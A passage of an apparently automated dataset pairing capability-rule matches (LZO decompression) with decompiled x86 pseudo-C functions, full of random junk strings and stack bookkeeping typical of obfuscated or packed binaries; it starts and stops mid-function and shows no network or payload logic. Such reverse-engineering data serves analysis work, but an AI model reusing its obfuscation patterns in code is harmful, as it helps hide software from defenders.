   puStack32 = &stack0xffffff80;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c9f0;\n    iStack28 = *in_FS_OFFSET;\n    puStack132 = &stack0xffffffe4;\n    *in_FS_OFFSET = puStack132;\n    uStack144 = 0;\n    uStack140 = 0xf;\n    iStack160 = 0;\n    uStack184 = uStack184 & 0xffffff00 | uStack36;\n    pcStack180 = \"zhirrjwoqbkvhkgruolrqeopttxajytwpdkozgusvxlymgkcvdndfviwykfxdclkidkjehymkpzkfzpoqrpaafcoi\";\n    uStack188 = 0x59;\n    fcn.00402f72();\n    pcStack176 = *0x5426d0;\n    uStack164 = *0x5426dc;\n    uStack136 = 0x1d03;\n    puStack132 = puStack132 & 0xffffff00;\n    uVar5 = uStack140;\n    if (uStack140 < 0x10) {\ncode_r0x0043cefd:\n        uStack144 = 0;\n        uStack140 = 0xf;\n        iStack160 = 0;\n        pcStack180 = pcStack180 & 0xffffff00 | uStack36;\n        pcStack176 = \"jiakfujxruxlukcwtquqdduppbxidogtjpxmrugtyrxjxxlg\";\n        uStack184 = 0x30;\n        uStack188 = 0x43cf41;\n        puStack132 = uVar5;\n        fcn.00402f72();\n        uStack164 = 0x897;\n        puStack132 = 0x40dd4c00;\n        uStack136 = 0;\n        uStack188 = 0x43cf68;\n        fcn.004048a9();\n        fcn.00402e55();\n        pcStack176 = NULL;\n        uStack236 = uStack36;\n        pcStack232 = \"lziqxntiufzeyigfcdbavlulydtgckyqogyhsqdyrnlcahcjhwqzftlftbtvyseeaivgtdjawisekcpiigvrccdopmnrnj\";\n        uStack240 = 0x5e;\n        uStack244 = 0x43cfb5;\n        fcn.00402f72();\n        puStack228 = &stack0xffffff98;\n        uStack224 = 1;\n        uStack220 = 0x152a;\n        uStack212 = 0x40d61ac0;\n        uStack216 = 0;\n        uStack208 = 1;\n        uStack204 = 1;\n        uStack200 = 0;\n        uStack244 = 0x43cff2;\n        fcn.0040678f();\n        if (0xf < uStack84) {\n            uVar5 = uStack104;\n            if ((0xfff < uStack84 + 1) && (uVar5 = *(uStack104 - 4),  0x1f < (uStack104 - 4) - uVar5))\n            goto code_r0x0043d3b7;\n            pcStack176 = 0x43d029;\n            fcn.00401a32(uVar5);\n        }\n        uStack88 = 0;\n        uStack84 = 0xf;\n        uStack104 = uStack104 & 0xffffff00;\n        puStack48 = &stack0xffffff08;\n        puStack44 = &stack0xffffff44;\n        uStack188 = 0;\n        puStack40 = &stack0xffffff5c;\n        fcn.00402f72(0x61, uStack36, \n                     \"qbikywgicjpvqhzczgqmyzcmxylujvcthwkoqtmvhpphyboglqxlpwuzxqkdgxnwonfsrvljdmtrmwnjgumjsyltsjvxdaalw\"\n                    );\n        pcStack232 = NULL;\n        puStack228 = 0xf;\n        uStack248 = 0;\n        uStack20 = 5;\n        fcn.00402f72(0x2f, uStack36, \"zbembskqkxqfmhrfgorsxdvcsiuqdmkhxpswksujkoeiygi\");\n        puVar3 = puStack48;\n        *(puStack48 + 6) = 1;\n        *(puVar3 + 7) = 1;\n        uVar2 = *0x5426fc;\n        uVar1 = *0x5426f8;\n        uVar6 = *0x5426f4;\n        puVar3[8] = *0x5426f0;\n        puVar3[9] = uVar6;\n        puVar3[10] = uVar1;\n        puVar3[0xb] = uVar2;\n        *(puVar3 + 0xc) = 1;\n        puVar3[0xe] = 0x40e1e560;\n        puVar3[0xd] = 0;\n        uStack20 = 0xffffffff;\n        uVar6 = fcn.00404eb2();\n        puVar3 = puStack40;\n        puVar10 = puStack40 + -1;\n        puVar11 = puStack40 + -1;\n        puStack40[-1] = uVar6;\n        puVar3[-6] = 0;\n        puVar3[-2] = 0;\n        *puVar10 = 0xf;\n        *(puVar3 + -6) = 0;\n        *(puVar3 + -0xe) = uStack36;\n        puVar3[-0xd] = \"bwgldriymjyvbtjhupxmlfhrfyloavcttbmunqonunjgszrgfvogycemddiamjypuvjmkuqyfxerjbtzynahrqnsujtho\";\n        uStack164 = 0x5d;\n        puVar3[-0x10] = 0x43d143;\n        fcn.00402f72();\n        puVar3[-0xc] = &stack0xffffffb0;\n        uVar2 = *0x54271c;\n        uVar1 = *0x542718;\n        uVar6 = *0x542714;\n        puVar3[-0xb] = *0x542710;\n        puVar3[-10] = uVar6;\n        puVar3[-9] = uVar1;\n        puVar3[-8] = uVar2;\n        puVar3[-7] = 0x18d;\n        uStack60 = 0xf;\n        uStack64 = 9;\n        uStack80 = 0x7a646868;\n        uStack76 = 0x6d6e706f;\n        uStack72 = 0x6a;\n        uVar5 = *puVar11;\n        if (0xf < uVar5) {\n            iVar9 = puVar3[-6];\n            uVar7 = uVar5 + 1;\n            iVar8 = iVar9;\n            if (0xfff < uVar7) {\n                iVar8 = *(iVar9 + -4);\n                if (0x1f < (iVar9 + -4) - iVar8) goto code_r0x0043d3c3;\n                uVar7 = uVar5 + 0x24;\n            }\n            puVar3[-0x10] = uVar7;\n            puVar3[-0x11] = iVar8;\n            puVar3[-0x12] = 0x43d1b1;\n            fcn.00401a32(puVar3[-0x11]);\n        }\n        uVar5 = uStack60;\n        if (0xf < uStack60) {\n            uVar5 = uStack60 + 1;\n            uVar7 = uStack80;\n            if (0xfff < uVar5) {\n                uVar7 = *(uStack80 - 4);\n                if (0x1f < (uStack80 - 4) - uVar7) goto code_r0x0043d3cf;\n                uVar5 = uStack60 + 0x24;\n            }\n            puVar3[-1] = uVar5;\n            puVar3[-2] = uVar7;\n            puVar3[-3] = 0x43d1eb;\n            uVar5 = fcn.00401a32(puVar3[-2]);\n        }\n        puStack48 = puVar3;\n        uStack64 = 0;\n        uStack60 = 0xf;\n        uStack80 = uStack80 & 0xffffff00;\n        puVar3[-1] = uVar5;\n        puStack44 = puVar3 + -9;\n        puVar3[-9] = 0;\n        puVar3[-5] = 0;\n        puVar3[-4] = 0xf;\n        *(puVar3 + -9) = 0;\n        *(puVar3 + -0x1c) = uStack36;\n        puVar3[-0x1b] = \"qnojjbrcstebpuwnbsazfdqajrwkwkxirbkoaskemslbwllcfhpyq\";\n        puVar3[-0x1d] = 0x35;\n        puVar3[-0x1e] = 0x43d246;\n        fcn.00402f72();\n        puStack52 = puVar3 + -0x14;\n        puVar3[-0x14] = 0;\n        puVar3[-0x10] = 0;\n        puVar3[-0xf] = 0xf;\n        puStack40 = puVar3 + -0x1a;\n        *(puVar3 + -0x14) = 0;\n        uStack20 = 6;\n        *(puVar3 + -0x1f) = uStack36;\n        puVar3[-0x1e] = \"twtgocmslelfnqmhbptdafruagosqexpbtehyrdmugzqiszmyzonxziehkfnomragq\";\n        puVar3[-0x20] = 0x42;\n        puVar3[-0x21] = 0x43d28d;\n        fcn.00402f72();\n        puVar4 = puStack40;\n        *puStack40 = 0;\n        puVar4[4] = 0;\n        puVar4[5] = 0xf;\n        *puVar4 = 0;\n        uStack20 = 7;\n        *(puVar3 + -0x22) = uStack36;\n        puVar3[-0x21] = \"bduvzmxevxkpbpdshlxnqgpitpzgaheswvzekqarinztmhctleilqyqogbl\";\n        puVar3[-0x23] = 0x3b;\n        puVar3[-0x24] = 0x43d2cc;\n        fcn.00402f72();\n        puVar4 = puStack40;\n        uVar2 = *0x54273c;\n        uVar1 = *0x542738;\n        uVar6 = *0x542734;\n        puStack40[0xc] = *0x542730;\n        puVar4[0xd] = uVar6;\n        puVar4[0xe] = uVar1;\n        puVar4[0xf] = uVar2;\n        puVar4[0x10] = 0x14e;\n        puVar4[0x17] = 0x52b;\n        puVar4[0x19] = 0x40ca5400;\n        puVar4[0x18] = 0;\n        uStack20 = 0xffffffff;\n        puVar3[-0x24] = 0x43d302;\n        uVar6 = fcn.00401429();\n        puVar3 = puStack48;\n        puVar12 = puStack48 + -1;\n        puStack48[-1] = uVar6;\n        puVar3[-7] = 0;\n        puVar3[-3] = 0;\n        puVar3[-2] = 0xf;\n        *(puVar3 + -7) = 0;\n        *(puVar3 + -0xb) = uStack36;\n        puVar3[-10] = \n        \"taprcqdrejobglcsrnunezvijxgjxctvkfwdtyycdsrpsrseuenwgwzctlfoflvzmzdgtfanpqtaabgtegrmlzevvkvixtwoj\";\n        puVar3[-0xc] = 0x61;\n        puVar3[-0xd] = 0x43d347;\n        fcn.00402f72();\n        puVar3[-9] = &stack0xffffff80;\n        puVar3[-8] = 0x79a;\n        *puVar12 = 0x16ef;\n        puVar3[-0xd] = 0x43d35f;\n        fcn.0040142e();\n        if (0xf < uStack108) {\n            uVar5 = uStack108 + 1;\n            iVar9 = iStack128;\n            if (0xfff < uVar5) {\n                iVar9 = *(iStack128 + -4);\n                if (0x1f < (iStack128 + -4) - iVar9) goto code_r0x0043d3db;\n                uVar5 = uStack108 + 0x24;\n            }\n            puVar3[-1] = uVar5;\n            puVar3[-2] = iVar9;\n            puVar3[-3] = 0x43d395;\n            fcn.00401a32(puVar3[-2]);\n        }\n        *in_FS_OFFSET = iStack28;\n        return uStack56;\n    }\n    iVar9 = iStack160;\n    if ((uStack140 + 1 < 0x1000) || (iVar9 = *(iStack160 + -4),  (iStack160 + -4) - iVar9 < 0x20)) {\n        uStack200 = 0x43cefa;\n        uVar5 = fcn.00401a32(iVar9);\n        goto code_r0x0043cefd;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043d3b7:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043d3c3:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043d3cf:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0043d3db:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar6 = fcn.00403a76();\n    return uVar6;\n}\n",
        "token_count": 3827
    },
    "0043e680": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nint32_t * fcn.0043e680(void)\n\n{\n    int32_t arg_8h;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000018;\n    uint32_t in_stack_0000002c;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44ca60;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (0xf < in_stack_0000002c) {\n        arg_8h = in_stack_00000018;\n        if ((0xfff < in_stack_0000002c + 1) &&\n           (arg_8h = *(in_stack_00000018 + -4),  0x1f < (in_stack_00000018 + -4) - arg_8h)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            return 0;\n        }\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(arg_8h);\n    }\n    *in_FS_OFFSET = piStack28;\n    return piStack28;\n}\n",
        "token_count": 306
    },
    "004407e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004407e0(int32_t param_1, uint32_t param_2, uint param_3, int32_t param_4, uint param_5, uint32_t param_6, \n                 uint param_7, uint param_8, uint32_t param_9)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint uStack236;\n    uchar uStack232;\n    char *pcStack228;\n    uint uStack224;\n    ushort uStack220;\n    uchar uStack218;\n    uint uStack208;\n    uint uStack204;\n    int32_t iStack200;\n    uint uStack184;\n    uint32_t uStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    int32_t in_stack_ffffffd8;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cb10;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (param_6 < 0x10) {\ncode_r0x00440843:\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iStack60 = param_1;\n    if ((param_6 + 1 < 0x1000) || (iStack60 = *(param_1 + -4),  (param_1 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x00440843;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack236;\n    uStack68 = 0x44cb20;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack184 = 0;\n    uStack180 = 0xf;\n    iStack200 = 0;\n    uStack64 = 8;\n    uStack232 = iStack128;\n    pcStack228 = \"askqwodyyycfmnzbpgfvwmfmwcxbicimejixhzgxqmpxeoiygrpuyxmwupnhvarcvetesjlmfuzntwaetv\";\n    uStack236 = 0x52;\n    fcn.00402f72();\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack64 = 9;\n    fcn.00402f72(0x5f, iStack104, \n                 \"iszrkxprwdsngewwnzrgsyvzqywzvyzesxkkdflfusqbkqegmwskxcflkpzqbpnujqtmojeqlsahkznnqyqbkbzvujpvgqc\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 10;\n    fcn.00402f72(0x21, uStack224, \"crfyaqdyyoczncxrqqawhafxwyauamdhr\");\n    uStack204 = 0xf;\n    uStack208 = 6;\n    uStack224 = 0x7a65746c;\n    uStack220 = 0x7262;\n    uStack218 = 0;\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack64 = 0xb;\n    fcn.00402f72(0x21, iStack152, \"crfyaqdyyoczncxrqqawhafxwyauamdhr\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack64 = 0xc;\n    fcn.00402f72(0x21, uStack80, \"crfyaqdyyoczncxrqqawhafxwyauamdhr\");\n    if (uStack132 < 0x10) {\ncode_r0x00440a72:\n        if (0xf < uStack156) {\n            iVar2 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar2 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar2))\n            goto code_r0x00440c5b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack84) {\n            iVar2 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar2 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar2))\n            goto code_r0x00440c67;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack108) {\n            iVar2 = iStack128;\n            if ((0xfff < uStack108 + 1) && (iVar2 = *(iStack128 + -4),  0x1f < (iStack128 + -4) - iVar2))\n            goto code_r0x00440c73;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack180) {\n            iVar2 = iStack200;\n            if ((0xfff < uStack180 + 1) && (iVar2 = *(iStack200 + -4),  0x1f < (iStack200 + -4) - iVar2))\n            goto code_r0x00440c7f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack20) {\n            iVar2 = in_stack_ffffffd8;\n            if ((0xfff < uStack20 + 1) && (iVar2 = *(in_stack_ffffffd8 + -4),  0x1f < (in_stack_ffffffd8 + -4) - iVar2))\n            goto code_r0x00440c8b;\n            fcn.00401a32(iVar2);\n        }\n        uStack24 = 0;\n        uStack20 = 0xf;\n        if (0xf < param_2) {\n            iVar2 = unaff_EDI;\n            if ((0xfff < param_2 + 1) && (iVar2 = *(unaff_EDI + -4),  0x1f < (unaff_EDI + -4) - iVar2))\n            goto code_r0x00440c97;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < param_9) {\n            iVar2 = param_4;\n            if ((0xfff < param_9 + 1) && (iVar2 = *(param_4 + -4),  0x1f < (param_4 + -4) - iVar2))\n            goto code_r0x00440ca3;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack72;\n        return 0x123cb;\n    }\n    iVar2 = iStack152;\n    if ((uStack132 + 1 < 0x1000) || (iVar2 = *(iStack152 + -4),  (iStack152 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00440a72;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x00440c5b:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x00440c67:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x00440c73:\n    uStack64 = 3;\n    fcn.004047f5();\ncode_r0x00440c7f:\n    uStack64 = 4;\n    fcn.004047f5();\ncode_r0x00440c8b:\n    uStack64 = 5;\n    fcn.004047f5();\ncode_r0x00440c97:\n    uStack64 = 6;\n    fcn.004047f5();\ncode_r0x00440ca3:\n    uStack64 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 2105
    },
    "00441960": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00441960(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    uint uStack212;\n    uchar uStack208;\n    char *pcStack204;\n    int32_t iStack200;\n    uint uStack184;\n    uint32_t uStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    int32_t iStack152;\n    uint uStack136;\n    uint32_t uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar uStack80;\n    uint *puStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cb70;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x004419c3:\n        *in_FS_OFFSET = piStack28;\n        return 0x4a06;\n    }\n    iStack60 = param_1;\n    if ((in_stack_00000018 + 1 < 0x1000) || (iStack60 = *(param_1 + -4),  (param_1 + -4) - iStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(iStack60);\n        goto code_r0x004419c3;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack76 = &uStack212;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44cb80;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    uStack184 = 0;\n    uStack180 = 0xf;\n    iStack200 = 0;\n    uStack208 = uStack128;\n    pcStack204 = \"ouafpinthjmqmkawbzi\";\n    uStack212 = 0x13;\n    fcn.00402f72();\n    uStack108 = 0xf;\n    uStack112 = 0xf;\n    uStack128 = 0x73666569;\n    uStack124 = 0x776d6a79;\n    uStack120 = 0x7a767a66;\n    uStack116 = 0x787569;\n    uStack160 = 0;\n    uStack156 = 0xf;\n    iStack176 = 0;\n    uStack64 = 4;\n    fcn.00402f72(0x2f, iStack104, \"fqhizebtokrdaaclbrzxcizdoekccvpgqxbdaubaqgkxksn\");\n    uStack88 = 0;\n    uStack84 = 0xf;\n    iStack104 = 0;\n    uStack64 = 5;\n    fcn.00402f72(0x2f, iStack152, \"fqhizebtokrdaaclbrzxcizdoekccvpgqxbdaubaqgkxksn\");\n    uStack136 = 0;\n    uStack132 = 0xf;\n    iStack152 = 0;\n    uStack64 = 6;\n    fcn.00402f72(0x2f, uStack80, \"fqhizebtokrdaaclbrzxcizdoekccvpgqxbdaubaqgkxksn\");\n    if (uStack132 < 0x10) {\ncode_r0x00441ba4:\n        if (0xf < uStack84) {\n            iVar1 = iStack104;\n            if ((0xfff < uStack84 + 1) && (iVar1 = *(iStack104 + -4),  0x1f < (iStack104 + -4) - iVar1))\n            goto code_r0x00441c72;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack156) {\n            iVar1 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar1 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar1))\n            goto code_r0x00441c7e;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack180) {\n            iVar1 = iStack200;\n            if ((0xfff < uStack180 + 1) && (iVar1 = *(iStack200 + -4),  0x1f < (iStack200 + -4) - iVar1))\n            goto code_r0x00441c8a;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iVar1 = iStack152;\n    if ((uStack132 + 1 < 0x1000) || (iVar1 = *(iStack152 + -4),  (iStack152 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00441ba4;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\ncode_r0x00441c72:\n    uStack64 = 1;\n    fcn.004047f5();\ncode_r0x00441c7e:\n    uStack64 = 2;\n    fcn.004047f5();\ncode_r0x00441c8a:\n    uStack64 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 1467
    },
    "00442e20": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00442e20(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint uStack432;\n    uchar uStack428;\n    char *pcStack424;\n    uint uStack420;\n    uchar uStack416;\n    uint uStack404;\n    uint uStack400;\n    int32_t iStack396;\n    uint uStack380;\n    uint32_t uStack376;\n    int32_t iStack372;\n    uint uStack356;\n    uint32_t uStack352;\n    int32_t iStack348;\n    uint uStack332;\n    uint32_t uStack328;\n    uchar uStack324;\n    uint *puStack320;\n    int32_t *piStack316;\n    uint uStack312;\n    uint uStack308;\n    int32_t iStack304;\n    uint uStack260;\n    uchar uStack256;\n    char *pcStack252;\n    int32_t iStack248;\n    uint uStack232;\n    uint32_t uStack228;\n    uchar uStack224;\n    uint *puStack220;\n    int32_t *piStack216;\n    uint uStack212;\n    uint uStack208;\n    int32_t iStack204;\n    uint uStack160;\n    uchar uStack156;\n    char *pcStack152;\n    int32_t iStack148;\n    uint uStack132;\n    uint32_t uStack128;\n    uchar uStack124;\n    uint *puStack120;\n    int32_t *piStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uchar **ppuStack76;\n    int32_t *piStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cbc0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x00442e84:\n        *in_FS_OFFSET = piStack28;\n        return piStack28;\n    }\n    uStack60 = param_3;\n    if ((in_stack_00000020 + 1 < 0x1000) || (uStack60 = *(param_3 - 4),  (param_3 - 4) - uStack60 < 0x20)) {\n        ppuStack32 = &ppuStack32;\n        fcn.00401a32(uStack60);\n        goto code_r0x00442e84;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    ppuStack76 = &ppuStack76;\n    uStack64 = 0xffffffff;\n    uStack68 = 0x44cbd0;\n    piStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack72;\n    if (param_3 < 0x10) {\ncode_r0x00442f24:\n        *in_FS_OFFSET = piStack72;\n        return piStack72;\n    }\n    iStack104 = unaff_EBX;\n    if ((param_3 + 1 < 0x1000) || (iStack104 = *(unaff_EBX + -4),  (unaff_EBX + -4) - iStack104 < 0x20)) {\n        ppuStack76 = &ppuStack76;\n        fcn.00401a32(iStack104);\n        goto code_r0x00442f24;\n    }\n    uStack64 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack120 = &uStack160;\n    uStack108 = 0xffffffff;\n    uStack112 = 0x44cbe0;\n    piStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack116;\n    uStack132 = 0;\n    uStack128 = 0xf;\n    iStack148 = 0;\n    uStack156 = uStack124;\n    pcStack152 = \"mkhynzcumrqojxbjsrhrpdmzchdy\";\n    uStack160 = 0x1c;\n    fcn.00402f72();\n    if (uStack128 < 0x10) {\ncode_r0x00442ffd:\n        *in_FS_OFFSET = piStack116;\n        return 1;\n    }\n    iStack204 = iStack148;\n    if ((uStack128 + 1 < 0x1000) || (iStack204 = *(iStack148 + -4),  (iStack148 + -4) - iStack204 < 0x20)) {\n        fcn.00401a32(iStack204);\n        goto code_r0x00442ffd;\n    }\n    uStack108 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack220 = &uStack260;\n    uStack208 = 0xffffffff;\n    uStack212 = 0x44cbf0;\n    piStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack216;\n    uStack232 = 0;\n    uStack228 = 0xf;\n    iStack248 = 0;\n    uStack256 = uStack224;\n    pcStack252 = \"xbjcqsopzxgmgsskjjwqwisjjyfxyhggccmjvfhvpddpmppphamdizjydkyxwnlzuegdabiwpryhryehinasiilijipltxcmejce\";\n    uStack260 = 100;\n    fcn.00402f72();\n    if (uStack228 < 0x10) {\ncode_r0x004430cd:\n        *in_FS_OFFSET = piStack216;\n        return 1;\n    }\n    iStack304 = iStack248;\n    if ((uStack228 + 1 < 0x1000) || (iStack304 = *(iStack248 + -4),  (iStack248 + -4) - iStack304 < 0x20)) {\n        fcn.00401a32(iStack304);\n        goto code_r0x004430cd;\n    }\n    uStack208 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack320 = &uStack432;\n    uStack308 = 0xffffffff;\n    uStack312 = 0x44cc00;\n    piStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack316;\n    uStack380 = 0;\n    uStack376 = 0xf;\n    iStack396 = 0;\n    uStack428 = uStack420;\n    pcStack424 = \"mpldtncladetfdpljzhf\";\n    uStack432 = 0x14;\n    fcn.00402f72();\n    uStack400 = 0xf;\n    uStack404 = 4;\n    uStack420 = 0x6c6a6d6c;\n    uStack416 = 0;\n    uStack356 = 0;\n    uStack352 = 0xf;\n    iStack372 = 0;\n    uStack308 = 2;\n    fcn.00402f72(0x14, iStack348, \"mpldtncladetfdpljzhf\");\n    uStack332 = 0;\n    uStack328 = 0xf;\n    iStack348 = 0;\n    uStack308 = 3;\n    fcn.00402f72(0x14, uStack324, \"mpldtncladetfdpljzhf\");\n    if (uStack328 < 0x10) {\ncode_r0x0044323f:\n        if (0xf < uStack352) {\n            iVar1 = iStack372;\n            if ((0xfff < uStack352 + 1) && (iVar1 = *(iStack372 + -4),  0x1f < (iStack372 + -4) - iVar1))\n            goto code_r0x004432d3;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack376) {\n            iVar1 = iStack396;\n            if ((0xfff < uStack376 + 1) && (iVar1 = *(iStack396 + -4),  0x1f < (iStack396 + -4) - iVar1))\n            goto code_r0x004432df;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack316;\n        return piStack316;\n    }\n    iVar1 = iStack348;\n    if ((uStack328 + 1 < 0x1000) || (iVar1 = *(iStack348 + -4),  (iStack348 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0044323f;\n    }\n    uStack308 = 0;\n    fcn.004047f5();\ncode_r0x004432d3:\n    uStack308 = 1;\n    fcn.004047f5();\ncode_r0x004432df:\n    uStack308 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar1 = fcn.00403a76();\n    return iVar1;\n}\n",
        "token_count": 2183
    },
    "00443890": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __fastcall fcn.00443890(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uchar *puVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    int32_t *in_FS_OFFSET;\n    uint auStack196 [19];\n    uint uStack120;\n    uint uStack104;\n    uint uStack100;\n    int32_t iStack96;\n    uint32_t auStack92 [4];\n    uint uStack76;\n    uint32_t uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *puStack48;\n    uint *puStack44;\n    int32_t *piStack40;\n    uchar uStack36;\n    uchar *puStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack44 = &stack0xffffffa4;\n    puStack32 = &stack0xffffffa4;\n    uStack24 = 0x44cc20;\n    iStack28 = 